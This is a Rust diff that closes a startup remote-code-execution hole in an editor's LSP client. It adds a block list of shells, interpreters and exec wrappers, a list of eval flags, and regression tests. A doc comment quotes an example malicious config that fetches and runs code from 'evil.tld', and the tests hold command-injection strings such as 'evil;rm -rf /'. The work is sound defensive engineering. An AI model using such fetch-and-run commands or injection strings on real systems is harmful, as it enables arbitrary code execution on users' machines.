@@ -119,6 +119,27 @@ impl LspClient {
         root: &Path,
         shell_init: &str,
     ) -> Result<Self, String> {
+        // `command`, `args` and `env` all come from settings.json, which may
+        // ship with a cloned repository. Validate every one of them before a
+        // process exists — see `is_safe_command_name` / `is_safe_arg`.
+        if !is_safe_command_name(command) {
+            let msg = format!(
+                "refusing to start LSP server '{}': unsafe command {:?}",
+                name, command
+            );
+            log::warn!("[lsp] {}", msg);
+            return Err(msg);
+        }
+        if let Some(bad) = args.iter().find(|a| !is_safe_arg(a)) {
+            let msg = format!(
+                "refusing to start LSP server '{}': argument {:?} makes the program \
+                 execute an argument as code",
+                name, bad
+            );
+            log::warn!("[lsp] {}", msg);
+            return Err(msg);
+        }
+
         // Resolve command path via shell (handles GUI-app PATH issues on macOS).
         let resolved_cmd = resolve_command(command, shell_init)
             .ok_or_else(|| format!("LSP server '{}' not found: {}", name, command))?;
@@ -573,14 +594,150 @@ fn read_lsp_message<R: BufRead>(reader: &mut R) -> Result<Option<LspMessage>, St
     }
 }
 
-/// Returns `true` if `name` contains only characters safe for shell interpolation
-/// (alphanumeric, hyphen, underscore, dot, forward slash).
-/// Rejects shell metacharacters like `;`, `|`, `$`, backtick, etc.
+/// Programs that run code handed to them as an argument: shells, interpreters,
+/// and the wrappers (`env`, `xargs`, `nohup`, ...) that exist to launch them.
+///
+/// Character-level validation of `command` alone is not enough, because `args`
+/// is passed to the process verbatim and comes from the same file. A repository
+/// shipping `{"lsp_enabled": true, "lsp_servers": [{"command": "/bin/sh",
+/// "args": ["-c", "curl evil.tld|sh"]}]}` would otherwise execute arbitrary
+/// code the moment it is opened — `start_servers` runs from `DirigentApp::new`,
+/// with no user interaction. A language server is always a long-lived binary
+/// speaking JSON-RPC over stdio, never an interpreter invocation, so refusing
+/// these names costs nothing legitimate.
+const CODE_EXECUTING_PROGRAMS: &[&str] = &[
+    // Shells.
+    "sh",
+    "bash",
+    "zsh",
+    "dash",
+    "ksh",
+    "mksh",
+    "csh",
+    "tcsh",
+    "fish",
+    "ash",
+    "busybox",
+    "pwsh",
+    "powershell",
+    // Wrappers whose whole job is to exec whatever they are handed.
+    "env",
+    "xargs",
+    "nohup",
+    "setsid",
+    "stdbuf",
+    "nice",
+    "timeout",
+    "script",
+    "sudo",
+    "doas",
+    "open",
+    // Interpreters and language runtimes.
+    "node",
+    "nodejs",
+    "deno",
+    "bun",
+    "python",
+    "pypy",
+    "ruby",
+    "perl",
+    "php",
+    "lua",
+    "luajit",
+    "tclsh",
+    "wish",
+    "osascript",
+    "awk",
+    "gawk",
+    "mawk",
+    "nawk",
+    "sed",
+    "groovy",
+    "scala",
+    "jshell",
+    "irb",
+    "elixir",
+    "iex",
+    "erl",
+    "escript",
+    "java",
+    "swift",
+    "ghci",
+    "runghc",
+    "runhaskell",
+    "rscript",
+    "r",
+    "julia",
+    "guile",
+    "emacs",
+    "vim",
+];
+
+/// Flags that make a program treat an argument as code rather than data.
+///
+/// Second line of defence behind [`CODE_EXECUTING_PROGRAMS`]: it catches an
+/// interpreter that reaches `spawn` under a name not on that list (a wrapper
+/// script, a vendored binary, a language runtime we did not enumerate).
+/// Real language servers take flags like `--stdio`, `--languageserver` or a
+/// data directory — never an eval flag.
+const CODE_EXECUTING_FLAGS: &[&str] = &[
+    "-c",     // sh/bash/zsh/python/ruby/php: run the next argument
+    "-e",     // perl/ruby/node/sed: evaluate
+    "-E",     // perl: evaluate with features enabled
+    "--eval", // node/deno/bun/php/emacs
+    "--eval-file",
+    "--execute",
+    "-execute",
+    "--exec",
+    "-exec", // find(1)
+    "--command",
+    "-command",
+    "--expression",
+    "-expression",
+];
+
+/// The lowercased program name a command path refers to
+/// (`/usr/bin/python3.12` -> `python3.12`).
+fn program_basename(command: &str) -> String {
+    Path::new(command)
+        .file_name()
+        .map(|n| n.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default()
+}
+
+/// Returns `true` if `name` is safe to spawn as a language server.
+///
+/// Two rules, both required:
+/// 1. Only characters safe for shell interpolation (alphanumeric, hyphen,
+///    underscore, dot, forward slash) — rejects `;`, `|`, `$`, backtick, etc.,
+///    since [`resolve_command`] falls back to a login-shell `which`.
+/// 2. The program is not a shell, interpreter, or exec wrapper
+///    ([`CODE_EXECUTING_PROGRAMS`]), which would turn `args` into a
+///    code-execution channel.
 fn is_safe_command_name(name: &str) -> bool {
-    !name.is_empty()
-        && name
+    if name.is_empty()
+        || !name
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
+    {
+        return false;
+    }
+    let base = program_basename(name);
+    // Also compare without a trailing version suffix, so `python3.12` and
+    // `perl5.34` are caught by the `python` / `perl` entries.
+    let unversioned = base.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.');
+    !CODE_EXECUTING_PROGRAMS
+        .iter()
+        .any(|p| *p == base || *p == unversioned)
+}
+
+/// Returns `true` if `arg` is safe to pass to a language server process.
+///
+/// Rejects eval-style flags in both spellings a program may accept them in
+/// (`--eval CODE` and `--eval=CODE`).
+fn is_safe_arg(arg: &str) -> bool {
+    let flag = arg.split('=').next().unwrap_or(arg);
+    !CODE_EXECUTING_FLAGS.contains(&flag)
 }
 
 /// Returns `true` if `name` is a safe environment variable to set for a spawned
@@ -694,7 +851,7 @@ fn language_id_from_path(path: &Path) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::{is_safe_command_name, is_safe_env_name};
+    use super::{is_safe_arg, is_safe_command_name, is_safe_env_name, LspClient};
 
     #[test]
     fn rejects_command_names_with_shell_metacharacters() {
@@ -704,6 +861,124 @@ mod tests {
         assert!(!is_safe_command_name("evil;rm -rf /"));
         assert!(!is_safe_command_name("$(payload)"));
         assert!(!is_safe_command_name(""));
+    }
+
+    #[test]
+    fn rejects_shells_and_interpreters_as_the_command() {
+        // These pass the character allowlist but execute whatever `args` says,
+        // so permitting them makes `args` a code-execution channel.
+        for evil in [
+            "/bin/sh",
+            "sh",
+            "bash",
+            "/bin/zsh",
+            "/usr/bin/env",
+            "node",
+            "python3",
+            "/usr/bin/python3.12",
+            "perl5.34",
+            "ruby",
+            "php",
+            "osascript",
+            "java",
+            "xargs",
+            "nohup",
+            "/usr/bin/open",
+        ] {
+            assert!(!is_safe_command_name(evil), "{evil} must be rejected");
+        }
+
+        // Real language servers must keep working.
+        for ok in [
+            "rust-analyzer",
+            "clangd",
+            "gopls",
+            "pylsp",
+            "typescript-language-server",
+            "lua-language-server",
+            "elixir-ls",
+            "sourcekit-lsp",
+            "OmniSharp",
+            "zls",
+            "/opt/homebrew/bin/jdtls",
+        ] {
+            assert!(is_safe_command_name(ok), "{ok} must be allowed");
+        }
+    }
+
+    #[test]
+    fn rejects_arguments_that_execute_code() {
+        for evil in [
+            "-c",
+            "-e",
+            "-E",
+            "--eval",
+            "--eval=1+1",
+            "--eval-file",
+            "-exec",
+            "--exec=payload",
+            "--command",
+            "-command",
+            "--expression",
+        ] {
+            assert!(!is_safe_arg(evil), "{evil} must be rejected");
+        }
+
+        // Ordinary language server arguments.
+        for ok in [
+            "--stdio",
+            "stdio",
+            "--languageserver",
+            "--log-level=debug",
+            "-data",
+            "/Users/me/.cache/jdtls",
+            "--clang-tidy",
+            "",
+        ] {
+            assert!(is_safe_arg(ok), "{ok:?} must be allowed");
+        }
+    }
+
+    #[test]
+    fn spawn_refuses_the_shell_payload_without_running_it() {
+        // End-to-end regression for the startup RCE: a cloned repository whose
+        // `.Dirigent/settings.json` sets `{"command": "/bin/sh", "args":
+        // ["-c", "..."]}` must not get a process, since `start_servers` runs
+        // from `DirigentApp::new()` with no user interaction.
+        let dir = tempfile::tempdir().unwrap();
+        let canary = dir.path().join("pwned");
+        let payload = format!("touch {}", canary.display());
+
+        let Err(err) = LspClient::spawn(
+            "evil",
+            "/bin/sh",
+            &["-c".to_string(), payload.clone()],
+            &[],
+            dir.path(),
+            "",
+        ) else {
+            panic!("spawning /bin/sh must be refused");
+        };
+        assert!(err.contains("unsafe command"), "unexpected error: {err}");
+        assert!(!canary.exists(), "payload ran");
+
+        // And again with a command that is not itself a shell, to prove the
+        // argument check is a second, independent gate.
+        let Err(err) = LspClient::spawn(
+            "evil",
+            "rust-analyzer",
+            &["-c".to_string(), payload],
+            &[],
+            dir.path(),
+            "",
+        ) else {
+            panic!("an eval-style argument must be refused");
+        };
+        assert!(
+            err.contains("execute an argument"),
+            "unexpected error: {err}"
+        );
+        assert!(!canary.exists(), "payload ran");
     }
 
     #[test]
